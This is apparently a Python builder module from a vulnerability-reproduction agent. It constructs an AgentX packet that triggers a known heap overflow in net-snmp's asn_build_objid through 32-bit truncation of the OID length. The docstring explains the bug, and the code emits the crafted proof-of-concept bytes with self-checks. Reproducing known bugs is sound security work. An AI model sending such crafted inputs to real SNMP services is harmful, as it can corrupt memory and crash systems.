"""CG-38（arvo:52465 / net-snmp）OID 前两段 ASN 长度截断构造器。

**缺陷**：snmplib/asn1.c 的 asn_build_objid()：

    objid_val = (op[0] * 40) + op[1];      /* u_long，64 位 */
    first_objid_val = objid_val;
    ...
    asnlength += encoded_oid_len (objid_val);   /* 形参是 uint32_t -> 截断 */

当 op[0]==2 且 op[1] 接近 0xFFFFFFFF 时，first = 80 + op[1] 超过 2^32，
encoded_oid_len 收到的是截断后的 32 位值（可能只有 79 -> 1 字节），
但真正写出去的 7bit 编码要 5 字节 —— 少算 4 字节，asn_build_header 之后的
逐字节写出就越过调用方给的缓冲区（官方：76 字节堆块，写 1 字节越界）。
patch 把 encoded_oid_len 的形参从 oid 改成 uint32_t（并入参宽度问题）。

**输入形态**（testing/fuzzing/snmp_api_fuzzer.c）：
  1) 整个输入先被 agentx_parse() 当 AgentX 包解析（20 字节头 + payload）；
  2) 同一份字节又被 af_* 依次消费：前 20B = value，1B = var 类型，
     4 个 int 共 17B，然后第 37..111 共 75 字节作为**输出缓冲区**（strlen 决定大小）。
本构造器发 AGENTX_MSG_OPEN：payload = timeout(4) + OID(4B 头 + n*4B 子标识) + 描述串。
OID 前两段取 (2, 0xFFFFFFFF)，触发 32 位截断。
"""
from __future__ import annotations

import struct

FIELDS = {
    "n_tail": "int(0..24), 前两段之后的子标识个数（默认 19，铺满 37..111 让输出缓冲最长）",
    "subid0": "int, 第一段（必须是 0..2，否则 asn_build_objid 直接报错；默认 2）",
    "subid1": "int, 第二段（默认 0xFFFFFFFF，越大越能触发截断）",
    "tail_base": "int, 尾部子标识基数（默认 0x41424344，四字节全非零）",
    "cmd": "int, AgentX 命令（默认 1 = OPEN）",
}

DECLARED_SINK = {
    "file": "snmplib/asn1.c",
    "line": 1610,
    "symbol": "asn_build_objid",
    "note": "encoded_oid_len(uint32_t) 截断 first=(40*objid[0]+objid[1])，少算 4 字节后越界写",
}


class SnmpOidResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "snmp_oid"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> SnmpOidResult:
    fields = dict(fields or {})
    try:
        n_tail = int(fields.get("n_tail", 19))
        subid0 = int(fields.get("subid0", 2))
        subid1 = int(fields.get("subid1", 0xFFFFFFFF))
        tail_base = int(fields.get("tail_base", 0x41424344))
        cmd = int(fields.get("cmd", 1))
    except (TypeError, ValueError):
        return SnmpOidResult(False, reason="n_tail/subid0/subid1/tail_base/cmd 必须是整数")
    if not 0 <= n_tail <= 24:
        return SnmpOidResult(False, reason="n_tail 越界（0..24）: %d" % n_tail)
    if not 0 <= subid0 <= 2:
        return SnmpOidResult(False, reason="subid0 必须在 0..2，否则 asn_build_objid 直接返回错误: %d" % subid0)
    if not 0 <= subid1 <= 0xFFFFFFFF:
        return SnmpOidResult(False, reason="subid1 越界: %d" % subid1)
    if not 0 <= cmd <= 20:
        return SnmpOidResult(False, reason="cmd 越界: %d" % cmd)

    hdr = bytearray([1, cmd, 0, 0]) + struct.pack("<III", 0, 0, 0) + b"\x00\x00\x00\x00"
    payload = bytearray(b"\x41\x41\x41\x41")            # timeout
    subs = [subid0, subid1] + [(tail_base + i) & 0xFFFFFFFF for i in range(n_tail)]
    payload += bytes([len(subs) & 0xFF, 0, 0, 0])       # OID 头
    for s in subs:
        payload += struct.pack("<I", s)
    payload += struct.pack("<I", 4) + b"AAAA"           # 描述串
    while len(payload) < 140:                           # 让 37..111 铺满非零字节
        payload += b"\x41"
    out = bytearray(hdr) + payload
    struct.pack_into("<I", out, 16, len(payload))
    cp1 = bytes(out[37:112])
    cp1_nul = cp1.find(b"\x00")
    used = {"n_tail": n_tail, "n_subid": len(subs), "subid0": subid0, "subid1": subid1,
            "cmd": cmd, "bytes": len(out),
            "outbuf_len": 75 if cp1_nul < 0 else cp1_nul}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "snmp_oid 构造器不识别该字段"}
               for k in fields if k not in known]
    return SnmpOidResult(True, bytes(out), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：OID 前两段编码长度被截断成 32 位，越界写。"""
    return {
        "claim_id": "cg38-net-snmp-oid-trunc",
        "subject": "asn_build_objid",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/snmp_oid.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "snmp_oid"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.data[0] == 1 and r.data[1] == 1
    assert r.fields_used["n_subid"] == 21
    assert r.fields_used["outbuf_len"] == 75
    assert not build({"subid0": 3}).ok
    assert not build({"n_tail": 99}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "asn_build_objid" and c["sink"]["file"] == "snmplib/asn1.c"
    print("snmp_oid builder self-check OK:", r.to_record())
